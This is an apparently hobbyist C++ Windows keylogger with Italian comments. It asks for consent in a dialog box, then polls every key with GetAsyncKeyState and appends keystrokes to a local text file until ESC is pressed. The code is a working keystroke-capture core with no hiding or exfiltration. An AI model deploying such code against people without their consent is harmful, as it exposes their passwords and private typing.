/*Keylogger create by zuhns - (Elia)*/
#include <windows.h>
#include <iostream>
#include <fstream>

using namespace std;

bool EULA()
{
    const char* message = "Vuoi acconsentire alla registrazione di tutti i tasti premuti mentre il programma e' in esecuzione?";
    int result = MessageBoxA(nullptr, message, "Condizioni", MB_YESNO | MB_ICONQUESTION);
    if (result == IDYES) 
    {
        return true;
    } 
    return false;
}

int main() 
{
    if(!EULA())
    {
        cout << "Accesso negato!";
        return 0;
    }

    ofstream outputFile("tasti_premuti.txt", ios::app);
    outputFile << "\n\n\n\n\n\n############SESSIONE NUOVA################\n\n\n";

    const char* info = "Premere il tasto 'ESC' per terminare il programma";
    MessageBoxA(nullptr, info, "Messaggio", MB_OK | MB_ICONEXCLAMATION);

    while(!(GetAsyncKeyState(VK_ESCAPE) & 0x8000))
    {
        for (int i = 0; i < 256; ++i) 
        {
            if (GetAsyncKeyState(i) & 0x8001) 
            {
                Sleep(100);
                // Il tasto i è stato premuto
                cout << "Tasto premuto: "; 
                switch (i) 
                {
                    case VK_RETURN:
                        cout << "Enter" << endl;
                        outputFile <<endl;
                        break;
                    case VK_SPACE:
                        cout << "Spazio" << endl;
                        outputFile << " ";
                        break;
                    case VK_TAB:
                        cout << "Tab" << endl;
                        outputFile << "    ";
                        break;
                    case VK_BACK:
                        cout << "Backspace" << endl;
                        outputFile << "(Backspace) ";
                        break;
                    case VK_SHIFT:
                        cout << "Shift" << endl;
                        outputFile << "(Shift) ";
                        break;
                    case VK_CONTROL:
                        cout << "CTRL" << endl;
                        outputFile << "(CTRL) " ;
                        break;
                    case VK_MENU:
                        cout << "ALT" << endl;
                        outputFile << "(ALT) ";
                        break;
                    default:
                         cout << static_cast<char>(i) << endl;
                         outputFile << static_cast<char>(i);
                }
            }
        }
        Sleep(10);
    }

    outputFile.close(); // Chiude il file
    return 0;
}
